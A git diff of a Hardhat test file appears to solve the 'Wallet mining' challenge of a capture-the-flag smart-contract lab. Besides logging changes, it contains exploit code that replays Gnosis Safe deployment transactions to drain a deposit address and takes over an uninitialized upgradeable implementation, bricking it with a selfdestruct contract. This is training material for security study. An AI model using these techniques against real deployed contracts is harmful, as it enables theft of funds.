@@ -2,6 +2,8 @@ const { ethers, upgrades, deployments } = require('hardhat');
 const { expect } = require('chai');
 const { calculateProxyAddress } = require('@gnosis.pm/safe-contracts');
 
+const log = console.log;
+
 describe('[Challenge] Wallet mining', function () {
     let deployer, player;
     let token, authorizer, walletDeployer;
@@ -65,11 +67,29 @@ describe('[Challenge] Wallet mining', function () {
         expect(await token.balanceOf(player.address)).eq(0);
     });
 
+    /**
+     * @dev
+     * 
+     * Overview of exploit
+     * 
+     * This challenge consists of two main exploits to solve the challenge.
+     * 
+     * 1. Replaying the deploying of Gnosis Safes Master Copy and factory to get
+     *    code deployed at the predefined addreses
+     * 2. Bricking the implementation AuthorizerUpgradeable contract to pass the 
+     *    checks in the WalletDeployer contract
+     * 
+     */
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
 
+        const printPlayerTokenBalance = async () => {
+            let bal = await token.balanceOf(player.address);
+            log("Player balance = ", ethers.utils.formatEther(bal))
+        }
+
         const data = require("./data.json");
-        console.log("Player address is", player.address)
+        log("Player address is", player.address)
         
         const attackWalletDeployer = walletDeployer.connect(player);
         const attackAuthorizer = authorizer.connect(player);
@@ -87,7 +107,7 @@ describe('[Challenge] Wallet mining', function () {
         //  Nonce 0
         const deploySafeTx = await (await ethers.provider.sendTransaction(data.DEPLOY_SAFE_TX)).wait();
         const safeContractAddr = deploySafeTx.contractAddress;
-        console.log("Replayed deploy Master Safe Copy at", safeContractAddr);
+        log("Replayed deploy Master Safe Copy at", safeContractAddr);
 
         // Do same thing but with nonce 1
         const randomTx = await (await ethers.provider.sendTransaction(data.RANDOM_TX)).wait();
@@ -98,7 +118,7 @@ describe('[Challenge] Wallet mining', function () {
         // Nonce 2
         const deployFactoryTx = await (await ethers.provider.sendTransaction(data.DEPLOY_FACTORY_TX)).wait();
         const factoryContractAddr = deployFactoryTx.contractAddress;
-        console.log("Replayed deploy safe factory at", factoryContractAddr);
+        log("Replayed deploy safe factory at", factoryContractAddr);
 
         // Connect to proxy factory
         const proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", factoryContractAddr, player);
@@ -137,7 +157,7 @@ describe('[Challenge] Wallet mining', function () {
             });
             nonceRequired += 1;
         }
-        console.log(`Need to deploy ${nonceRequired} proxies to get access to 20mil`);
+        log(`Need to deploy ${nonceRequired} proxies to get access to 20mil`);
 
         for (let i = 0; i < nonceRequired ; i ++) {
             await proxyFactory.createProxy(safeContractAddr, setupDummyABIData);
@@ -157,7 +177,7 @@ describe('[Challenge] Wallet mining', function () {
         const depositAddrSafe = await ethers.getContractAt("GnosisSafe", DEPOSIT_ADDRESS, player);
 
         // Test that we are connected
-        console.log("Version:", await depositAddrSafe.VERSION());
+        log("Version:", await depositAddrSafe.VERSION());
         
         // Params for the execTransaction
         const transactionParams = [
@@ -181,10 +201,10 @@ describe('[Challenge] Wallet mining', function () {
         const signedIncreaseV = ethers.BigNumber.from(signed).add(4).toHexString();
 
         // Remove nonce from params and pass in params as well as signed hash
+        log("Executing signed tx to transfer all tokens to player address");
         await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signedIncreaseV);
 
-        let bal = await token.balanceOf(player.address);
-        console.log("Player balance = ", ethers.utils.formatEther(bal))
+        await printPlayerTokenBalance()
         // Part 1 of the exploit is complete!
 
         // Part 2: Bricking the implementation contract
@@ -196,6 +216,7 @@ describe('[Challenge] Wallet mining', function () {
         const impContract = await ethers.getContractAt("AuthorizerUpgradeable", implementationAddress, player);
 
         // Deploy attacking contract that has selfdestruct
+        log("Deploying attacking contract");
         const attackContractFactory = await ethers.getContractFactory("AttackWalletMining", player);
         const attackContract = await attackContractFactory.deploy();
 
@@ -205,19 +226,19 @@ describe('[Challenge] Wallet mining', function () {
 
         // Init implementation contract to claim ownership of the contract
         // Upgrade to and call attacking contract, calling selfdestruct
+        log("Claiming ownership of implementation contract and upgrading to attacking contract");
         await impContract.init([], []);
         await impContract.upgradeToAndCall(attackContract.address, IAttack);
 
-        await attackContract.printValues(attackAuthorizer.address, player.address, DEPOSIT_ADDRESS);
-
         // Deploy 43 Wallets through wallet deployer to retrieve all 
         // tokens in the contract
+        log("Deploying 43 proxies through Deployer and collecting tokens")
         for (let i = 0; i < 43; i ++) {
-            await attackWalletDeployer.drop(setupDummyABIData);
+            await (await attackWalletDeployer.drop(setupDummyABIData)).wait();
         }
 
-        bal = await token.balanceOf(player.address);
-        console.log("Player balance = ", ethers.utils.formatEther(bal))
+        await printPlayerTokenBalance()
+
         // Part 2 complete!
 
     });
